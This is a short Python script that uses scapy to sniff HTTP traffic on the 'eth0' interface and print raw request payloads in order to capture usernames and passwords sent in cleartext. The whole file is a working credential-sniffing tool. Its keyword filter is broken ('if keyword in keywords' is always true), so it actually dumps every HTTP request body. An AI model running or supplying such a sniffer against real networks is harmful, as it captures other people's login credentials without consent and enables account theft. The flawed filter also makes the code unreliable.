#! /usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=processSniffedPackage)


def processSniffedPackage(packet):
    # HTTPRequest is an existing
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "password", "pass", "login"]
            for keyword in keywords:
                if keyword in keywords:
                    print(load)
                    break


sniff("eth0")
